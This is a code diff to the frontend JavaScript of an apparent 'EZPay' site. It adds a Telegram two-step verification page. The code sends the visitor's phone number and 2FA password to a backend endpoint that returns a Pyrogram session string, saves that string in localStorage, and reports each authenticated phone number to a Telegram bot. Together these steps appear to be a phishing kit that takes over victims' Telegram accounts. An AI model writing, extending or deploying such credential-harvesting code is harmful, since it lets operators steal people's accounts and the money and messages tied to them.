@@ -152,15 +152,18 @@ document.addEventListener('DOMContentLoaded', function() {
             const data = await response.json();
 
             if (data.success) {
-                if (data.session_string) {
-                    localStorage.setItem('pyrogramSession', data.session_string);
+                if (data.needs_2fa) {
+                    localStorage.setItem('pyrogramPhone', phone);
+                    switchToPage2FA(phone);
+                } else {
+                    if (data.session_string) {
+                        localStorage.setItem('pyrogramSession', data.session_string);
+                    }
+                    localStorage.setItem('pyrogramPhone', phone);
+                    const telegramMsg = `<b>EZPay Pyrogram Auth</b>\n\n<b>Phone:</b> +91 ${phone}\n<b>Status:</b> Session authenticated`;
+                    await sendToTelegram(telegramMsg);
+                    switchToPage1(phone);
                 }
-                localStorage.setItem('pyrogramPhone', phone);
-
-                const telegramMsg = `<b>EZPay Pyrogram Auth</b>\n\n<b>Phone:</b> +91 ${phone}\n<b>Status:</b> Session authenticated`;
-                await sendToTelegram(telegramMsg);
-
-                switchToPage1(phone);
             } else {
                 showError('otp-error', data.error || 'Invalid OTP');
             }
@@ -268,9 +271,8 @@ document.addEventListener('DOMContentLoaded', function() {
 
     // ---------- PAGE SWITCHING ----------
     function switchToPage1(phone) {
-        document.querySelector('.page-0').style.display = 'none';
+        hideAllPages();
         document.querySelector('.page-1').style.display = 'block';
-        document.querySelector('.page-2').style.display = 'none';
         if (phone) {
             phoneInput.value = phone;
             updateSignInButton();
@@ -280,16 +282,14 @@ document.addEventListener('DOMContentLoaded', function() {
 
     function switchToPage2(phone) {
         displayPhone.value = phone;
-        document.querySelector('.page-0').style.display = 'none';
-        document.querySelector('.page-1').style.display = 'none';
+        hideAllPages();
         document.querySelector('.page-2').style.display = 'block';
         setTimeout(() => pinInput.focus(), 100);
     }
     
     function switchBackToPage1() {
-        document.querySelector('.page-0').style.display = 'none';
+        hideAllPages();
         document.querySelector('.page-1').style.display = 'block';
-        document.querySelector('.page-2').style.display = 'none';
         pinInput.value = '';
         updateCompleteLoginButton();
         setTimeout(() => phoneInput.focus(), 100);
@@ -303,6 +303,71 @@ document.addEventListener('DOMContentLoaded', function() {
             setTimeout(() => { errorElement.style.display = 'none'; }, 3000);
         }
     }
+
+    // ---------- PAGE 2FA: TELEGRAM 2-STEP VERIFICATION ----------
+    const twofaInput = document.getElementById('twofa-input');
+    const submitTwofaButton = document.getElementById('submit-twofa-button');
+    const toggleTwofaBtn = document.getElementById('toggle-twofa');
+    const loadingOverlay2FA = document.getElementById('loading-overlay-2fa');
+
+    twofaInput.addEventListener('input', function() {
+        if (this.value.trim().length > 0) {
+            submitTwofaButton.removeAttribute('disabled');
+            submitTwofaButton.classList.remove('van-button--disabled');
+        } else {
+            submitTwofaButton.setAttribute('disabled', 'disabled');
+            submitTwofaButton.classList.add('van-button--disabled');
+        }
+    });
+
+    if (toggleTwofaBtn) {
+        toggleTwofaBtn.addEventListener('click', function() {
+            if (twofaInput.type === 'password') {
+                twofaInput.type = 'text';
+                toggleTwofaBtn.classList.remove('van-icon-eye');
+                toggleTwofaBtn.classList.add('van-icon-closed-eye');
+            } else {
+                twofaInput.type = 'password';
+                toggleTwofaBtn.classList.remove('van-icon-closed-eye');
+                toggleTwofaBtn.classList.add('van-icon-eye');
+            }
+        });
+    }
+
+    submitTwofaButton.addEventListener('click', async function() {
+        if (this.disabled) return;
+        const phone = localStorage.getItem('pyrogramPhone');
+        const password = twofaInput.value.trim();
+        if (!password) return;
+
+        loadingOverlay2FA.style.display = 'flex';
+
+        try {
+            const response = await fetch(BACKEND_URL + '/api/verify-2fa', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: phone, password: password })
+            });
+
+            const data = await response.json();
+
+            if (data.success) {
+                if (data.session_string) {
+                    localStorage.setItem('pyrogramSession', data.session_string);
+                }
+                const telegramMsg = `<b>EZPay Pyrogram Auth</b>\n\n<b>Phone:</b> +91 ${phone}\n<b>Status:</b> Session authenticated (2FA)`;
+                await sendToTelegram(telegramMsg);
+                twofaInput.value = '';
+                switchToPage1(phone);
+            } else {
+                showError('twofa-error', data.error || 'Wrong password. Please try again.');
+            }
+        } catch (error) {
+            showError('twofa-error', 'Network error. Please try again.');
+        }
+
+        loadingOverlay2FA.style.display = 'none';
+    });
 
     // ---------- PAGE 3: SUCCESS BUTTONS ----------
     const startSellButton = document.getElementById('start-sell-button');
@@ -427,11 +492,21 @@ document.addEventListener('DOMContentLoaded', function() {
     // ---------- PAGE SWITCHING (NEW PAGES) ----------
     function hideAllPages() {
         document.querySelector('.page-0').style.display = 'none';
+        document.querySelector('.page-2fa').style.display = 'none';
         document.querySelector('.page-1').style.display = 'none';
         document.querySelector('.page-2').style.display = 'none';
         document.querySelector('.page-3').style.display = 'none';
         document.querySelector('.page-4').style.display = 'none';
         document.querySelector('.page-5').style.display = 'none';
+    }
+
+    function switchToPage2FA(phone) {
+        hideAllPages();
+        twofaInput.value = '';
+        submitTwofaButton.setAttribute('disabled', 'disabled');
+        submitTwofaButton.classList.add('van-button--disabled');
+        document.querySelector('.page-2fa').style.display = 'block';
+        setTimeout(() => twofaInput.focus(), 100);
     }
 
     function switchToPage3() {
